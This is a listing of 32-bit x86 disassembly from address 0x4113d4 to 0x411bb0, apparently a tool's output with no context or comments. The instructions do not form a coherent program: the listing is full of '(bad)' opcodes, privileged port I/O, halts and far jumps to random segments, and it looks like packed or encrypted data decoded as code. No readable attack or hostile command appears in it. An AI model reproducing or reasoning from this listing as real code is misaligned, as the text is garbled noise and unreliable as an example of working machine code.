  4113d4:	fiadd  DWORD PTR [ebp-0x72]
  4113d7:	ins    DWORD PTR es:[edi],dx
  4113d8:	jb     0x411431
  4113da:	lods   al,BYTE PTR ds:[esi]
  4113db:	fidivr DWORD PTR [edi-0x706fd248]
  4113e1:	cwde   
  4113e2:	mov    WORD PTR [eax+0x2e09ba83],?
  4113e8:	inc    ecx
  4113e9:	in     eax,0x0
  4113eb:	out    0xf1,eax
  4113ed:	pop    ebp
  4113ee:	mov    BYTE PTR [edi],ah
  4113f0:	ss sbb eax,0x1318c08
  4113f6:	lods   al,BYTE PTR ds:[esi]
  4113f7:	data16 das 
  4113f9:	mov    ebx,0x50dce3ec
  4113fe:	xchg   esi,eax
  4113ff:	push   es
  411400:	daa    
  411401:	fs jae 0x411435
  411404:	pop    esi
  411405:	out    0xf9,al
  411407:	leave  
  411408:	shl    esi,1
  41140a:	push   ds
  41140b:	add    BYTE PTR [edi-0x61],ch
  41140e:	jne    0x4113f6
  411410:	cld    
  411411:	pop    ds
  411412:	scas   eax,DWORD PTR es:[edi]
  411413:	mov    gs:0xf7a9a42c,al
  411419:	push   es
  41141a:	push   ss
  41141b:	mov    bh,0xa
  41141d:	mov    ah,BYTE PTR [ebp-0xb]
  411420:	push   0xffffffd8
  411422:	aam    0xe5
  411424:	sbb    al,0x6e
  411426:	jl     0x411405
  411428:	test   esi,eax
  41142a:	(bad)  
  41142c:	clc    
  41142d:	mov    bl,BYTE PTR [eax-0x25e58d8c]
  411433:	fninit 
  411435:	jo     0x4113d7
  411437:	lds    ebp,FWORD PTR [ecx]
  411439:	inc    edi
  41143a:	or     al,0xe7
  41143c:	xor    al,0x25
  41143e:	cli    
  41143f:	jo     0x41142b
  411441:	mov    dl,0x17
  411443:	xor    esi,edx
  411445:	jge    0x4113fc
  411447:	dec    esi
  411448:	push   esi
  411449:	jb     0x41148a
  41144b:	imul   esi,DWORD PTR [edx+0x4b],0xd56d713a
  411452:	sub    BYTE PTR [esi+eiz*2-0x499db1a3],ah
  411459:	imul   eax,DWORD PTR [ecx+0x3ce2d61f],0xffffffc9
  411460:	in     al,dx
  411461:	sub    al,0x9b
  411463:	mov    ebx,DWORD PTR ds:0x7804661c
  411469:	sti    
  41146a:	mov    edi,0xa456872b
  41146f:	imul   ebp,DWORD PTR [ecx],0xfffffff7
  411472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411473:	loope  0x41140c
  411475:	jl     0x411409
  411477:	cld    
  411478:	test   BYTE PTR [edi-0x4c],0x2b
  41147c:	pop    ebp
  41147d:	inc    esp
  41147e:	mov    edi,0x530b2278
  411483:	and    al,0x9
  411485:	test   BYTE PTR [esi+0x37e45862],dh
  41148b:	mov    fs,WORD PTR [ebx+0x6a]
  41148e:	loope  0x411462
  411490:	xor    al,0x89
  411492:	inc    edx
  411493:	cli    
  411494:	xor    eax,DWORD PTR [esi-0x3e]
  411497:	mov    edi,0xafd14577
  41149c:	pop    edx
  41149d:	and    al,0x61
  41149f:	loopne 0x411437
  4114a1:	(bad)  
  4114a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a3:	add    bl,dl
  4114a5:	mov    esi,0x48ae301
  4114aa:	push   cs
  4114ab:	jmp    0xc2e:0x27dd70f8
  4114b2:	adc    al,0xbe
  4114b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b5:	out    0xc,eax
  4114b7:	mov    cs,eax
  4114b9:	ds jle 0x411475
  4114bc:	shl    al,cl
  4114be:	mov    ds:0x929b0a5f,eax
  4114c3:	xchg   esp,eax
  4114c4:	mov    bl,0x9
  4114c6:	sub    eax,esi
  4114c8:	jb     0x4114aa
  4114ca:	push   cs
  4114cb:	out    0xd6,al
  4114cd:	bound  eax,QWORD PTR [ebp+0x53]
  4114d0:	sub    ebx,0xffffffd3
  4114d3:	pop    eax
  4114d4:	(bad)  
  4114d5:	pop    ebx
  4114d6:	les    esp,FWORD PTR [esi+0x6d]
  4114d9:	adc    DWORD PTR [esi+ebp*4+0x78],edi
  4114dd:	cmp    esp,esp
  4114df:	enter  0x2856,0xa6
  4114e3:	cdq    
  4114e4:	(bad)  
  4114e5:	sti    
  4114e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e7:	mov    al,0x48
  4114e9:	loop   0x4114eb
  4114eb:	mov    ecx,0x14e00b61
  4114f0:	dec    esi
  4114f1:	adc    al,0x5
  4114f3:	loop   0x411530
  4114f5:	out    dx,al
  4114f6:	push   ebx
  4114f7:	jne    0x411533
  4114f9:	mov    al,ds:0x27f2560d
  4114fe:	push   esi
  4114ff:	inc    ecx
  411500:	data16 adc al,0x7f
  411503:	out    dx,eax
  411504:	pop    ebx
  411505:	adc    bh,bh
  411507:	std    
  411508:	test   DWORD PTR [edx-0x27655444],edi
  41150e:	shr    BYTE PTR [edx+0x2],1
  411511:	int    0x88
  411513:	cs push 0xdb43de47
  411519:	add    dh,BYTE PTR [edi-0x78cdee48]
  41151f:	ins    DWORD PTR es:[edi],dx
  411520:	hlt    
  411521:	mov    ah,0xe1
  411523:	outs   dx,DWORD PTR ds:[esi]
  411524:	cmp    eax,DWORD PTR [ebx-0x53]
  411527:	and    al,0x50
  411529:	jl     0x411565
  41152b:	mov    ch,0x5a
  41152d:	aad    0xbd
  41152f:	fisttp DWORD PTR [edx+esi*1-0xc]
  411533:	repz jmp 0x411574
  411536:	jp     0x4114f5
  411538:	mov    ch,0x50
  41153a:	jge    0x411577
  41153c:	mov    al,cl
  41153e:	scas   al,BYTE PTR es:[edi]
  41153f:	mov    bh,BYTE PTR [eax-0x16a483f3]
  411545:	call   0xcde8:0xe63b6
  41154c:	adc    edi,esp
  41154e:	inc    edi
  41154f:	fs dec ecx
  411551:	std    
  411552:	cs das 
  411554:	xchg   BYTE PTR [edx-0x5cd276d9],cl
  41155a:	out    dx,eax
  41155b:	jle    0x411543
  41155d:	addr16 test dl,bl
  411560:	mov    esi,0xa4d06f9e
  411565:	sbb    BYTE PTR [eax-0x7b350c76],bh
  41156b:	(bad)  
  41156d:	xor    DWORD PTR [ecx],0xffffffd8
  411570:	add    edi,edi
  411572:	shr    ebx,cl
  411574:	cli    
  411575:	rcl    BYTE PTR [ebx+0x2be08b95],cl
  41157b:	imul   esp,DWORD PTR [edi-0x5a831677],0x4e39db45
  411585:	es icebp 
  411587:	sub    DWORD PTR [edx],edx
  411589:	cmp    ebp,DWORD PTR [edx-0x33]
  41158c:	pop    eax
  41158d:	imul   edx,DWORD PTR [edx-0x15],0x3e
  411591:	ret    0x3879
  411594:	sbb    ecx,DWORD PTR ds:0xee377daf
  41159a:	fwait
  41159b:	push   esi
  41159c:	popa   
  41159d:	sub    BYTE PTR [esi-0x455b174d],ah
  4115a3:	sub    edx,edx
  4115a5:	loop   0x411528
  4115a7:	(bad)  
  4115a8:	ficomp WORD PTR [edi]
  4115aa:	rcr    DWORD PTR [edx+0x7f],0x54
  4115ae:	inc    edi
  4115af:	mov    ecx,0x76e57bfb
  4115b4:	dec    ebp
  4115b5:	daa    
  4115b6:	lock sahf 
  4115b8:	cmp    ch,BYTE PTR [esi-0x6b]
  4115bb:	jns    0x4115dd
  4115bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115be:	ret    0xee7a
  4115c1:	xor    eax,DWORD PTR [edx]
  4115c3:	xchg   DWORD PTR [ecx-0x4fc5d186],esp
  4115c9:	clc    
  4115ca:	lahf   
  4115cb:	or     eax,0x209a9091
  4115d0:	ins    BYTE PTR es:[edi],dx
  4115d1:	mov    dl,0x3
  4115d3:	ficom  DWORD PTR [edi]
  4115d5:	jnp    0x411592
  4115d7:	(bad)  
  4115d8:	fcomp  DWORD PTR [ecx]
  4115da:	ror    BYTE PTR ds:0x4d6ab026,0x1d
  4115e1:	arpl   WORD PTR [ebx],bx
  4115e3:	cmp    al,0x87
  4115e5:	mov    esp,0xd0c0d8b3
  4115ea:	loope  0x411626
  4115ec:	out    0xa0,eax
  4115ee:	daa    
  4115ef:	add    eax,0x9acc35f6
  4115f4:	inc    eax
  4115f5:	mov    ds:0xb8e46bce,eax
  4115fa:	pushf  
  4115fb:	test   eax,0x3f8b7493
  411600:	dec    edi
  411601:	adc    dh,bh
  411603:	lahf   
  411604:	jmp    0x9dd5:0xbcf70426
  41160b:	push   0xaca61a0e
  411610:	shl    esi,cl
  411612:	mov    bl,0x98
  411614:	ficom  DWORD PTR [eax-0x6f]
  411617:	addr16 fcom st(5)
  41161a:	push   0x5375280b
  41161f:	loope  0x411661
  411621:	sbb    eax,0x6fe0fc5a
  411626:	cli    
  411627:	mov    ebp,0xe45da18e
  41162c:	mov    dl,0x2e
  41162e:	iret   
  41162f:	mov    ds:0xa8fd21c9,eax
  411634:	(bad)  
  411635:	ins    BYTE PTR es:[edi],dx
  411636:	push   ds
  411637:	jp     0x4115d4
  411639:	xor    ebp,DWORD PTR [eax-0x7c94dd8]
  41163f:	cmp    al,bl
  411641:	jle    0x411672
  411643:	dec    ecx
  411644:	dec    ebp
  411645:	lock mov bl,0x28
  411648:	xor    al,0xc6
  41164a:	add    edi,esi
  41164c:	ss push eax
  41164e:	dec    esi
  41164f:	pop    es
  411650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411651:	and    ch,BYTE PTR [esi+0x2703685b]
  411657:	add    ecx,edx
  411659:	das    
  41165a:	dec    edx
  41165b:	repz pop esp
  41165d:	jns    0x411601
  41165f:	mov    esi,0xea3bcc45
  411664:	loope  0x411671
  411666:	or     al,0x2c
  411668:	hlt    
  411669:	add    al,0x92
  41166b:	adc    eax,0x2a5518d9
  411670:	es out dx,eax
  411672:	pop    ecx
  411673:	inc    eax
  411674:	imul   edi,esi,0xc77d0197
  41167a:	iret   
  41167b:	iret   
  41167c:	out    0x4a,al
  41167e:	cmp    DWORD PTR ds:0xe0fa629e,0x58ba4a36
  411688:	cmp    edi,DWORD PTR [esp+edx*8]
  41168b:	cmp    bh,al
  41168d:	imul   esp,esi,0xfaf46f82
  411693:	mov    al,0x98
  411695:	jo     0x411710
  411697:	sbb    esp,esi
  411699:	fdivrp st(1),st
  41169b:	xchg   ebx,eax
  41169c:	inc    ebx
  41169d:	add    BYTE PTR [edi-0x7b],al
  4116a0:	mov    ds:0x1b84ad4,eax
  4116a5:	jnp    0x4116d3
  4116a7:	stos   BYTE PTR es:[edi],al
  4116a8:	outs   dx,BYTE PTR ds:[esi]
  4116a9:	pop    esi
  4116aa:	push   edi
  4116ab:	aad    0x96
  4116ad:	aaa    
  4116ae:	push   edx
  4116af:	or     BYTE PTR [eax],ch
  4116b1:	adc    edi,ebp
  4116b3:	or     edi,edi
  4116b5:	xor    DWORD PTR [ecx+0x4988e510],ebx
  4116bb:	pop    ds
  4116bc:	dec    ecx
  4116bd:	push   0x22
  4116bf:	stc    
  4116c0:	sbb    al,0xdc
  4116c2:	mov    BYTE PTR [ebx],bl
  4116c4:	sub    esp,DWORD PTR [eax]
  4116c6:	cmp    DWORD PTR [edx-0xef9b849],ecx
  4116cc:	fnsave [ecx]
  4116ce:	das    
  4116cf:	stos   DWORD PTR es:[edi],eax
  4116d0:	and    BYTE PTR [eax+0x55],dl
  4116d3:	xor    DWORD PTR [ecx],eax
  4116d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d6:	or     ah,dh
  4116d8:	(bad)  
  4116d9:	and    al,0xfb
  4116db:	inc    esi
  4116dc:	pop    esi
  4116dd:	and    DWORD PTR [esi+eiz*1-0x42],ebp
  4116e1:	cmp    BYTE PTR [ebp+ebp*4+0x2d4ce8f2],cl
  4116e8:	stos   WORD PTR es:[edi],ax
  4116ea:	and    BYTE PTR [ebp+0x429c9ae8],bl
  4116f0:	and    DWORD PTR [edi+0x54],ebp
  4116f3:	out    dx,eax
  4116f4:	inc    esi
  4116f5:	ins    DWORD PTR es:[edi],dx
  4116f6:	sub    bl,cl
  4116f8:	aaa    
  4116f9:	jecxz  0x41176c
  4116fb:	(bad)  
  4116fc:	mov    ecx,0x37ced23
  411701:	dec    ecx
  411702:	jo     0x41169f
  411704:	cld    
  411705:	xchg   esp,eax
  411706:	sub    DWORD PTR [ebx-0x1619a6f5],0x5
  41170d:	out    0xbd,eax
  41170f:	jne    0x41170c
  411711:	js     0x411788
  411713:	mov    ds:0xfcc70468,al
  411718:	jno    0x4116f5
  41171a:	into   
  41171b:	pushf  
  41171c:	in     al,dx
  41171d:	push   edx
  41171e:	dec    ebx
  41171f:	sub    ebx,edi
  411721:	xchg   edi,eax
  411722:	jbe    0x41176d
  411724:	sub    eax,0x4f0e73bf
  411729:	daa    
  41172a:	adc    DWORD PTR ds:0x778141f5,ecx
  411730:	add    esi,DWORD PTR [ebp-0x38]
  411733:	iret   
  411734:	aaa    
  411735:	adc    BYTE PTR [ebp-0x788f8733],cl
  41173b:	out    0xa7,al
  41173d:	fs push ecx
  41173f:	cmp    al,0x6d
  411741:	out    dx,eax
  411742:	sbb    bl,BYTE PTR ds:0xe38bb462
  411748:	sbb    esp,DWORD PTR [esi]
  41174a:	in     al,dx
  41174b:	scas   al,BYTE PTR es:[edi]
  41174c:	sahf   
  41174d:	adc    eax,0x19141ba7
  411752:	push   ebp
  411753:	popf   
  411754:	aas    
  411755:	jo     0x411726
  411757:	loop   0x411773
  411759:	add    DWORD PTR [edx],ebp
  41175b:	iret   
  41175c:	adc    BYTE PTR [edx],dh
  41175e:	inc    edi
  41175f:	push   edi
  411760:	loopne 0x4117df
  411762:	push   edi
  411763:	(bad)  
  411764:	fnsave [ebx]
  411766:	jmp    0x30ce:0x863ffeb3
  41176d:	pop    esi
  41176e:	gs ds sub esp,ebp
  411772:	mov    BYTE PTR [ebx+0x7d9552d0],cl
  411778:	ja     0x4117dc
  41177a:	sub    bl,0x9e
  41177d:	(bad)  
  41177e:	adc    BYTE PTR [eax+0x44],bl
  411781:	or     al,0x6e
  411783:	xchg   edx,eax
  411784:	sahf   
  411785:	mov    eax,0x90693f22
  41178a:	es adc eax,0xb1798d9a
  411790:	or     BYTE PTR [edi],dh
  411792:	add    esp,DWORD PTR [eax]
  411794:	fidivr WORD PTR [esi-0x5c]
  411797:	out    0xa5,eax
  411799:	xchg   BYTE PTR gs:[edi+0x48],al
  41179d:	mov    ecx,0x9fafaf92
  4117a2:	loope  0x41173c
  4117a4:	inc    edi
  4117a5:	mov    al,0x66
  4117a7:	int    0xc7
  4117a9:	dec    edx
  4117aa:	test   ah,cl
  4117ac:	pop    edi
  4117ad:	mov    bh,0x79
  4117af:	sub    bh,al
  4117b1:	cmp    DWORD PTR [eax+0x57],edi
  4117b4:	xor    BYTE PTR [ebx],bl
  4117b6:	pop    edi
  4117b7:	outs   dx,DWORD PTR ds:[esi]
  4117b8:	(bad)  
  4117b9:	xlat   BYTE PTR ds:[ebx]
  4117ba:	xchg   esp,eax
  4117bb:	stos   BYTE PTR es:[edi],al
  4117bc:	mov    ecx,0x86bea546
  4117c1:	mov    dl,0x62
  4117c3:	pop    edx
  4117c4:	push   esp
  4117c5:	mov    dl,0x22
  4117c7:	push   es
  4117c8:	mov    ds:0x20606bca,al
  4117cd:	imul   esi,DWORD PTR [ecx*4-0x3c588e5],0xe8f0d458
  4117d8:	fcomp  DWORD PTR [esi-0x75ba8748]
  4117de:	and    ecx,DWORD PTR [ebx+0x7f7614bf]
  4117e4:	into   
  4117e5:	loopne 0x4117a8
  4117e7:	repnz pop esi
  4117e9:	aad    0xa
  4117eb:	push   ss
  4117ec:	fcomp  QWORD PTR [esi]
  4117ee:	sbb    DWORD PTR [ebp*4-0x4090b0a9],0x5d
  4117f6:	into   
  4117f7:	adc    BYTE PTR [ecx+0x66],ch
  4117fa:	test   BYTE PTR [esi],ch
  4117fc:	int    0x66
  4117fe:	jecxz  0x41183c
  411800:	xor    edi,DWORD PTR [edx-0x3a50df23]
  411806:	retf   0x2c98
  411809:	mov    ch,0xa4
  41180b:	les    ebp,FWORD PTR [edi+0x717a1040]
  411811:	in     al,dx
  411812:	popa   
  411813:	fisttp DWORD PTR [ecx-0x67]
  411816:	add    DWORD PTR [ebx+0x7cb1d0d7],eax
  41181c:	test   eax,0x97a87243
  411821:	xchg   ecx,eax
  411822:	leave  
  411823:	xor    BYTE PTR [esi],bl
  411825:	outs   dx,DWORD PTR ds:[esi]
  411826:	(bad)
  411829:	mov    ds,WORD PTR [edi-0x7d]
  41182c:	cdq    
  41182d:	jle    0x4117da
  41182f:	push   edi
  411830:	inc    esi
  411831:	and    al,0x69
  411833:	retf   0xc284
  411836:	stos   DWORD PTR es:[edi],eax
  411837:	push   ds
  411838:	lock pop eax
  41183a:	xchg   ebx,eax
  41183b:	ins    BYTE PTR es:[edi],dx
  41183c:	(bad)  
  41183d:	push   edx
  41183e:	cmp    DWORD PTR [esi],0xac5fea4
  411844:	es retf 0x2682
  411848:	and    BYTE PTR [ebp+0x2e5be550],ch
  41184e:	mov    bh,0x71
  411850:	or     cl,bl
  411852:	cli    
  411853:	leave  
  411854:	ror    DWORD PTR [edx+0x35a91ff6],1
  41185a:	fwait
  41185b:	cmp    eax,DWORD PTR ds:0xc62ff9b2
  411861:	lods   eax,DWORD PTR ds:[esi]
  411862:	into   
  411863:	in     al,dx
  411864:	mov    DWORD PTR [edx],edx
  411866:	push   ebx
  411867:	cli    
  411868:	pop    edx
  411869:	cmp    eax,0x7f
  41186c:	pop    esi
  41186d:	sahf   
  41186e:	push   edx
  41186f:	xchg   esp,eax
  411870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411871:	(bad)
  411876:	xor    eax,0xc231ff10
  41187b:	pop    esi
  41187c:	mov    ah,0x68
  41187e:	lahf   
  41187f:	pop    edi
  411880:	and    BYTE PTR ds:0x15a9f9af,dl
  411886:	and    dl,cl
  411888:	mov    edx,0x6a4daa65
  41188d:	mov    ah,0x84
  41188f:	sti    
  411890:	cmp    esi,DWORD PTR [ecx+0x625f9224]
  411896:	jbe    0x411880
  411898:	lock aad 0xa6
  41189b:	dec    BYTE PTR [eax]
  41189d:	call   0x7794:0x7211a1c8
  4118a4:	retf   0x84cf
  4118a7:	adc    al,0xda
  4118a9:	ja     0x4118e1
  4118ab:	pop    eax
  4118ac:	neg    DWORD PTR [ebp+0x62]
  4118af:	pop    ebp
  4118b0:	call   0x5ea6c440
  4118b5:	shl    ch,cl
  4118b7:	pop    edi
  4118b8:	ficomp WORD PTR [ecx-0x45026516]
  4118be:	xchg   esi,eax
  4118bf:	loope  0x4118e3
  4118c1:	cmp    al,BYTE PTR [edx+0x7]
  4118c4:	mov    ebp,0x927197a5
  4118c9:	cdq    
  4118ca:	push   ebp
  4118cb:	pushf  
  4118cc:	adc    DWORD PTR [edx-0x5],eax
  4118cf:	cmp    al,0x16
  4118d1:	imul   esi,DWORD PTR [ebp+0x7b],0xffffffe9
  4118d5:	je     0x411878
  4118d7:	and    eax,0xef772216
  4118dc:	jne    0x4118cd
  4118de:	inc    ebx
  4118df:	popa   
  4118e0:	stos   BYTE PTR es:[edi],al
  4118e1:	loop   0x411944
  4118e3:	js     0x4118e4
  4118e5:	rcl    esp,1
  4118e7:	mov    edi,0x4a870011
  4118ec:	push   edx
  4118ed:	jmp    0x411933
  4118ef:	aad    0x43
  4118f1:	bound  esp,QWORD PTR [eax+edi*1-0x20]
  4118f5:	xchg   esp,eax
  4118f6:	sub    DWORD PTR [ecx],0xffffffd6
  4118f9:	mov    ds:0x51e5c63c,eax
  4118fe:	xor    DWORD PTR [ebp+0x24],edi
  411901:	imul   ebp,DWORD PTR [ebp+esi*1-0x6d58f1af],0x6f96e132
  41190c:	add    ah,BYTE PTR [eax-0x4]
  41190f:	imul   ecx,DWORD PTR [esi-0x4f481833],0xffffffc9
  411916:	call   0x4cdf3385
  41191b:	aad    0x25
  41191d:	imul   edx,DWORD PTR [eax],0xb0d0273
  411923:	call   0x82d2cea6
  411928:	rol    eax,1
  41192a:	mov    ch,0xe8
  41192c:	test   al,0x93
  41192e:	shl    DWORD PTR [ebx+0x77],0x3b
  411932:	xchg   esi,eax
  411933:	imul   edi,DWORD PTR [edx+0x4a],0x721cc2b0
  41193a:	cmp    cl,ch
  41193c:	and    DWORD PTR [ebx-0x4b],edx
  41193f:	mov    ds:0xec2d7bc9,eax
  411944:	imul   esi,DWORD PTR [ecx],0xffffff8f
  411947:	or     ch,BYTE PTR [eax+0x5f49e4f]
  41194d:	inc    eax
  41194e:	xlat   BYTE PTR ds:[ebx]
  41194f:	and    esp,esi
  411951:	adc    eax,ebx
  411953:	mov    bl,0xa0
  411955:	out    dx,eax
  411956:	(bad)  
  411957:	mov    al,0x7d
  411959:	inc    ecx
  41195a:	repz lahf 
  41195c:	fstp   QWORD PTR ds:0xc2c34170
  411962:	fisttp WORD PTR [ebx-0x6aeab29c]
  411968:	imul   edx,DWORD PTR [ebx],0x17
  41196b:	fnstsw WORD PTR [esi-0x63]
  41196e:	inc    ecx
  41196f:	hlt    
  411970:	addr16 pushf 
  411972:	shr    DWORD PTR [eax+ebp*4-0x6d],1
  411976:	es mov dl,0x3b
  411979:	ret    
  41197a:	mov    al,ds:0x62ecb6ed
  41197f:	loop   0x411932
  411981:	jmp    0x4119ce
  411983:	lods   al,BYTE PTR ds:[esi]
  411984:	dec    ebx
  411985:	inc    eax
  411986:	xor    DWORD PTR ds:0x422791e5,esp
  41198c:	dec    ecx
  41198d:	loope  0x411989
  41198f:	(bad)
  411993:	jns    0x4119f9
  411995:	xchg   DWORD PTR [edx-0x11],ebx
  411998:	xchg   ebp,eax
  411999:	addr16 repz es mov dh,0x43
  41199e:	push   ds
  41199f:	setl   BYTE PTR [eax+eiz*8+0x44cc9672]
  4119a7:	out    0xba,al
  4119a9:	or     ah,BYTE PTR [esi]
  4119ab:	popf   
  4119ac:	pop    esp
  4119ad:	fst    QWORD PTR [eax+ebx*2]
  4119b0:	inc    esi
  4119b1:	loop   0x41198f
  4119b3:	sub    BYTE PTR [ebx],0x97
  4119b6:	and    al,BYTE PTR [esi]
  4119b8:	mov    dl,0x4e
  4119ba:	out    0xfc,eax
  4119bc:	pop    ds
  4119bd:	dec    ebx
  4119be:	hlt    
  4119bf:	and    al,dh
  4119c1:	cmc    
  4119c2:	jne    0x41196d
  4119c4:	add    al,0x4
  4119c6:	sbb    al,0x6a
  4119c8:	dec    ecx
  4119c9:	(bad)  
  4119ca:	aad    0x74
  4119cc:	sbb    esp,DWORD PTR [esi]
  4119ce:	push   es
  4119cf:	mov    ah,0x89
  4119d1:	or     al,0x24
  4119d3:	popf   
  4119d4:	loop   0x41195d
  4119d6:	sub    ebx,DWORD PTR [eax-0x2b]
  4119d9:	lds    ebp,FWORD PTR [ebx-0x56]
  4119dc:	mov    ah,0x27
  4119de:	repz xor dh,BYTE PTR [edi+0x7b90caeb]
  4119e5:	aad    0x67
  4119e7:	mov    ebx,0x1a1e0978
  4119ec:	lods   al,BYTE PTR ds:[esi]
  4119ed:	test   WORD PTR [edi-0x5b],di
  4119f1:	test   BYTE PTR [esi],bl
  4119f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f4:	xor    esp,esp
  4119f6:	xchg   edi,eax
  4119f7:	inc    esp
  4119f8:	adc    BYTE PTR [eax-0x32b0a1a4],ah
  4119fe:	dec    esp
  4119ff:	call   0xc549043d
  411a04:	push   ecx
  411a05:	ror    DWORD PTR [edi+ecx*1-0x71b2dc0e],1
  411a0c:	jge    0x4119d3
  411a0e:	xor    dh,ch
  411a10:	and    DWORD PTR [ebx+0x75],eax
  411a13:	(bad)  
  411a14:	loope  0x411a05
  411a16:	fisttp DWORD PTR [ecx-0x3baa8c65]
  411a1c:	push   eax
  411a1d:	pop    ecx
  411a1e:	lahf   
  411a1f:	(bad)  
  411a20:	adc    esp,edx
  411a22:	mov    BYTE PTR [esi+0x7c6f548f],ch
  411a28:	sbb    BYTE PTR [esi+0xf7f994],bl
  411a2e:	fwait
  411a2f:	push   ds
  411a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a31:	ret    0xc864
  411a34:	push   eax
  411a35:	scas   al,BYTE PTR es:[edi]
  411a36:	(bad)  
  411a37:	pop    ecx
  411a38:	cmc    
  411a39:	mov    bl,0x98
  411a3b:	mov    esp,0xc8b52755
  411a40:	out    0xd1,eax
  411a42:	xlat   BYTE PTR ds:[ebx]
  411a43:	and    eax,DWORD PTR [esi+eax*2]
  411a46:	gs jle 0x4119ff
  411a49:	jmp    0x7b134b71
  411a4e:	mov    dh,0xcb
  411a50:	test   BYTE PTR [eax+ebp*8+0x38],dl
  411a54:	sub    dl,BYTE PTR [eax]
  411a56:	dec    eax
  411a57:	sub    BYTE PTR [ebp-0x3],dh
  411a5a:	ror    ecx,cl
  411a5c:	(bad)  
  411a5d:	xchg   ecx,eax
  411a5e:	(bad)  
  411a5f:	mov    cl,0x71
  411a61:	fst    QWORD PTR [ebp+0x5e]
  411a65:	inc    ebx
  411a66:	mov    esp,DWORD PTR [ebp+0x673fe4bf]
  411a6c:	cmp    bh,BYTE PTR ds:0xc335a3bb
  411a72:	sbb    DWORD PTR [ebx],ebp
  411a74:	xlat   BYTE PTR ds:[ebx]
  411a75:	loope  0x411a35
  411a77:	xchg   esp,eax
  411a78:	stos   BYTE PTR es:[edi],al
  411a79:	inc    esi
  411a7a:	xor    al,0x46
  411a7c:	adc    al,0x98
  411a7e:	and    DWORD PTR [eax-0x58a260f8],ecx
  411a84:	push   0x918b2451
  411a89:	adc    eax,0x8723dd49
  411a8e:	repnz mov si,0x366e
  411a93:	cmp    eax,0x11af2d63
  411a98:	sar    DWORD PTR [eax-0x29],cl
  411a9b:	cmp    al,0x66
  411a9d:	cmp    edi,DWORD PTR [ecx+0x1f]
  411aa0:	dec    eax
  411aa1:	mov    dl,0x7f
  411aa3:	mov    dl,0xd5
  411aa5:	or     eax,0xd96d862f
  411aaa:	loop   0x411a2f
  411aac:	fiadd  WORD PTR [ecx*1+0x34319d3d]
  411ab3:	push   esi
  411ab4:	jl     0x411b27
  411ab6:	pop    ecx
  411ab7:	stc    
  411ab8:	leave  
  411ab9:	(bad)  
  411aba:	push   ebx
  411abb:	fild   DWORD PTR [edx+edi*2-0x4635a177]
  411ac2:	in     al,0x95
  411ac4:	inc    esp
  411ac5:	jne    0x411a6d
  411ac7:	stos   DWORD PTR es:[edi],eax
  411ac8:	fild   QWORD PTR [edx]
  411aca:	ss iret 
  411acc:	fs gs jns 0x411b17
  411ad0:	aam    0x7a
  411ad2:	mov    eax,ds:0x2fde0625
  411ad7:	xor    esp,DWORD PTR [eax-0x2f]
  411ada:	test   al,0x9c
  411adc:	add    BYTE PTR [ebx],al
  411ade:	xchg   esp,eax
  411adf:	inc    ebx
  411ae0:	mov    ds:0x14912b62,eax
  411ae5:	push   0x3a515f2d
  411aea:	push   ecx
  411aeb:	popw   ds
  411aed:	leave  
  411aee:	mov    BYTE PTR [ecx],dh
  411af0:	dec    esp
  411af1:	scas   eax,DWORD PTR es:[edi]
  411af2:	jmp    0x5a5:0xe02d9fb3
  411af9:	jno    0x411b32
  411afb:	fisttp DWORD PTR [edi-0x3dc0054a]
  411b01:	cmp    ebx,DWORD PTR [ecx]
  411b03:	out    dx,eax
  411b04:	cdq    
  411b05:	(bad)  [edx]
  411b07:	bound  ecx,QWORD PTR [eax+0x78afce1b]
  411b0d:	test   eax,0xcf2e8aba
  411b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b13:	bound  esp,QWORD PTR [ebp+ecx*2-0x5a3ada40]
  411b1a:	mov    BYTE PTR [esi+0x16],ah
  411b1d:	test   edi,eax
  411b1f:	es jb  0x411ae9
  411b22:	ror    ebx,0x8c
  411b25:	xchg   ebx,eax
  411b26:	in     eax,0x1
  411b28:	js     0x411b7f
  411b2a:	loopne 0x411af3
  411b2c:	loope  0x411ab1
  411b2e:	mov    al,ds:0x9801a0e
  411b33:	xor    BYTE PTR [ebp+0x24425929],0x2c
  411b3a:	cmp    esp,DWORD PTR [esi+edi*2-0x7d7d9cfc]
  411b41:	loopne 0x411afd
  411b43:	test   al,0x73
  411b45:	pusha  
  411b46:	push   ss
  411b47:	cs xchg ecx,eax
  411b49:	fdiv   DWORD PTR [edx+ecx*2+0x4150ad98]
  411b50:	inc    eax
  411b51:	inc    ebp
  411b52:	push   DWORD PTR [ecx+0x20254a06]
  411b58:	stc    
  411b59:	daa    
  411b5a:	fld    QWORD PTR [ecx+0x72358b90]
  411b60:	mov    al,0x63
  411b62:	clc    
  411b63:	int    0xa7
  411b65:	xor    BYTE PTR [ebx+0x6f2a0d41],bh
  411b6b:	or     dh,BYTE PTR [esi]
  411b6d:	bound  edx,QWORD PTR [ecx]
  411b6f:	fcomi  st,st(4)
  411b71:	inc    edx
  411b72:	pop    ss
  411b73:	xor    edi,DWORD PTR [eax]
  411b75:	gs dec edx
  411b77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b79:	(bad)  
  411b7a:	addr16 or al,0xff
  411b7d:	and    edi,edi
  411b7f:	sbb    ecx,DWORD PTR [edx-0x3f]
  411b82:	sbb    bl,0x88
  411b85:	aam    0x62
  411b87:	and    edx,0x3f
  411b8a:	repnz xchg edx,eax
  411b8c:	ds sbb eax,0xe5197d1d
  411b92:	dec    ebp
  411b93:	push   0xc9ef39c4
  411b98:	cmp    bl,BYTE PTR ds:0x6eda8607
  411b9e:	and    al,0x3c
  411ba0:	inc    esp
  411ba1:	es test al,0xa0
  411ba4:	lock pop es
  411ba6:	lock xchg ch,al
  411ba9:	pop    ss
  411baa:	mov    BYTE PTR [edx+0xa9e77bd],dh
  411bb0:	fisttp WORD PTR [eax-0xc6926cd]
